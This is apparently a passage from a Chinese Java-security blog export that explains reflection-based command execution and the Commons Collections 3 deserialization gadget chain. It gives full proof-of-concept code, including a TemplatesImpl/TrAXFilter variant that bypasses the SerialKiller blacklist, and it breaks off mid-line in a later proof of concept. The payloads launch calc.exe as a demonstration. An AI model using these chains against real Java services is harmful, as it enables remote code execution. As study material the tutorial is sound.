<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ReflectDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo9</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz),<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这么看有点麻烦。拆开来看。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ReflectDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo9</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Object rt=clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz);</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(rt,<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过<code>forName</code>获取<code>getRuntime</code>方法并调用，获取<code>Runtime</code>实例化对象。再获取<code>exec</code>方法并调用，来达到执行命令的目的。刚看到这里的时候有些疑惑。为什么在调用<code>getRuntime</code>方法时<code>invoke(clazz)</code>但是<code>exec</code>方法需要<code>invoke(rt)</code>，一个参数是<code>Class</code>一个参数是<code>Object</code>。查看了一下<code>invoke</code>方法，发现其参数确实是Object。也没有其他的重载。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1662608455979-bbd05d33-fed6-4144-9267-51728e80f3a5.png"
                      alt="image.png"
                ></p>
<p>后面查看<code>getRuntime</code>方法和<code>exec</code>方法，发现<code>getRuntime</code>方法是static。查阅资料并尝试后发现确实如此。<a class="link"   href="https://www.baeldung.com/java-invoke-static-method-reflection" >Gavra-invoke-static-method<i class="fas fa-external-link-alt"></i></a></p>
<p>除了使用<code>getRuntime</code>方法外。在获取Class类构造方法章节，我们提到过获取<code>private</code>构造方法的方式：<code>getDeclaredConstructors()</code>。恰巧在<code>Runtime</code>类中存在<code>private</code>构造方法。因此利用暴力反射同样可以获取<code>Runtime</code>实例化对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ReflectDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo9</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Constructor constructor= clazz.getDeclaredConstructor();</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Runtime rt= (Runtime) constructor.newInstance();</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(rt,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解决了无参数构造方法私有后，再来解决不存在无参数构造方法的问题。</p>
<p>普通的有参数构造方法在上面的获取Class类构造方法中提到过了。比较难理解的是当参数为数组时该怎么处理。</p>
<p>以常用到的，可以任意命令执行的另一个类：<code>ProcessBuilder</code>为例。其具有两个重载的构造方法。</p>
<ul>
<li>ProcessBuilder(List command)</li>
<li>ProcessBuilder(String… command)</li>
</ul>
<p>第一个好理解，只要传入的参数为List即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ReflectDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo10</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class clazz=Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        ((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>))).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重点在于第二个。其参数为可变长参数，对于可变长参数，java在编译时会编译成数组。也就是说在java中，以下两种方法是等价的，不可重载的</p>
<ul>
<li>ProcessBuilder(String… command)</li>
<li>ProcessBuilder(String[] command)</li>
</ul>
<p>查看<code>newInstance</code>方法，我们可以看到其参数为数组。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1662739375623-5a669727-2a5d-4443-8f28-b2b18c46671e.png"
                      alt="image.png"
                ></p>
<p>而<code>ProcessBuilder</code>的第二个构造函数参数同样也是数组。两者结合，便成为了二维数组。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.ReflectDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectDemo10</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class clazz=Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        ((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;)).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至于这里为什么是二维数组。我们可以这么去理解<code>Constructor</code>和<code>newInstance</code>之间的过程</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1662996613324-95c9eac1-2137-46cb-8bdb-7b8d39adfb61.png"
                      alt="image.png"
                ></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>TemplatesImpl和CommonsCollections3</title>
    <url>/2023/08/17/TemplatesImpl%E5%92%8CCommonsCollections3%E9%93%BE/</url>
    <content><![CDATA[<h2 id="What-is-CommonsCollections3"><a href="#What-is-CommonsCollections3" class="headerlink" title="What is CommonsCollections3?"></a>What is CommonsCollections3?</h2><p>在字节码的动态加载章节，可以通过<code>TemplatesImpl#newTransformer()</code>来加载字节码。</p>
<p>那么在实际的攻击中，该如何调用<code>TemplatesImpl#newTransformer()</code>？</p>
<p>在CC1链学习时存在如下代码：通过<code>ChainedTransformer#transform()</code>可以实现任意命令执行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将<code>TemplatesImpl</code>与<code>ChainedTransformer</code>结合，来执行<code>TemplatesImpl#newTransformer()</code>，构造代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections3</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">SetFieldValue</span><span class="params">(String FieldName,Object object,Object value)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Field field=object.getClass().getDeclaredField(FieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes= Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABVUZW1wbGF0ZXNJbXBsQ2xzLmphdmEMAA4ADwcAGwwAHAAdAQAMSGVsbG8gV29ybGQhBwAeDAAfACABABBUZW1wbGF0ZXNJbXBsQ2xzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAAUABgAAAAAAAwABAAcACAACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAADAALAAAABAABAAwAAQAHAA0AAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABEACwAAAAQAAQAMAAEADgAPAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAATAAQAFAAMABUAAQAQAAAAAgAR&quot;</span>);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;_name&quot;</span>,templates,<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;_bytecodes&quot;</span>,templates,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;_tfactory&quot;</span>,templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map innerMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map outerMap=TransformedMap.decorate(innerMap,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230817174216130.png"
                      alt="image-20230817174216130"
                ></p>
<p>之后再结合CC1提到的<code>AnnotationInvocationHandler</code>便可以成功构造反序列化链。</p>
<h2 id="Real-CommonsCollections3"><a href="#Real-CommonsCollections3" class="headerlink" title="Real CommonsCollections3"></a>Real CommonsCollections3</h2><p>在ysoserial出现之后，随之而来的是一系列反序列化过滤器。</p>
<p>以SerialKiller为例，SerialKiller通过黑名单的形式来避免被反序列化攻击。如下图：</p>
<p>在SerialKiller诞生之初，通过将<code>InvokerTransformer</code>加入黑名单来避免任意命令执行。为了对抗SerialKiller，CC3诞生了。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230818101917290.png"
                      alt="image-20230818101917290"
                ></p>
<p>看一下ysoserial中的CC3。核心代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">			<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">			<span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">					<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,</span><br><span class="line">					<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; templatesImpl &#125; )&#125;;</span><br></pre></td></tr></table></figure>

<p>这里用<code>InstantiateTransformer</code>替换<code>InvokerTransformer</code></p>
<p><code>InstantiateTransformer#transform()</code>如下：</p>
<p>其会获取参数input的构造方法。并将自身构造方法获取到的参数传递过去。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span> + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class)input).getConstructor(<span class="built_in">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> con.newInstance(<span class="built_in">this</span>.iArgs);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: The constructor must exist and be public &quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InstantiationException var7) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: InstantiationException&quot;</span>, var7);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException var8) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor must be public&quot;</span>, var8);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException var9) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor threw an exception&quot;</span>, var9);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显这里获取到的input是<code>TrAXFilter</code>， 查看其构造方法：</p>
<p>构造方法获取到的参数为<code>Templates</code>，在构造方法中会执行<code>templates.newTransformer()</code>。在这里就恰巧执行了<code>TemplatesImpl#newTransformer()</code>，触发了任意命令执行。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">        TransformerConfigurationException</span><br><span class="line">    &#123;</span><br><span class="line">        _templates = templates;</span><br><span class="line">        _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">        _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">        _overrideDefaultParser = _transformer.overrideDefaultParser();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>手写POC如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections3</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">SetFieldValue</span><span class="params">(String FieldName,Object object,Object value)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Field field=object.getClass().getDeclaredField(FieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes= Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABVUZW1wbGF0ZXNJbXBsQ2xzLmphdmEMAA4ADwcAGwwAHAAdAQAMSGVsbG8gV29ybGQhBwAeDAAfACABABBUZW1wbGF0ZXNJbXBsQ2xzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAAUABgAAAAAAAwABAAcACAACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAADAALAAAABAABAAwAAQAHAA0AAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABEACwAAAAQAAQAMAAEADgAPAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAATAAQAFAAMABUAAQAQAAAAAgAR&quot;</span>);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;_name&quot;</span>,templates,<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;_bytecodes&quot;</span>,templates,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;_tfactory&quot;</span>,templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map innerMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map outerMap=TransformedMap.decorate(innerMap,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230818110959169.png"
                      alt="image-20230818110959169"
                ></p>
<h2 id="jdk-gt-1-8-0-71"><a href="#jdk-gt-1-8-0-71" class="headerlink" title="jdk&gt;1.8.0_71"></a>jdk&gt;1.8.0_71</h2><p>在第一段最后提到过：结合CC1提到的<code>AnnotationInvocationHandler</code>便可以成功构造反序列化链。</p>
<p>这里为什么没有提到“结合CC6中的<code>TiedMapEntry</code>”来构造反序列化链呢？</p>
<p>尝试使用<code>TiedMapEntry</code>构造POC如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntryForCC3</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">SetFieldValue</span><span class="params">(String FieldName,Object object,Object value)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Field field=object.getClass().getDeclaredField(FieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes= Base64.getDecoder().decode(<span 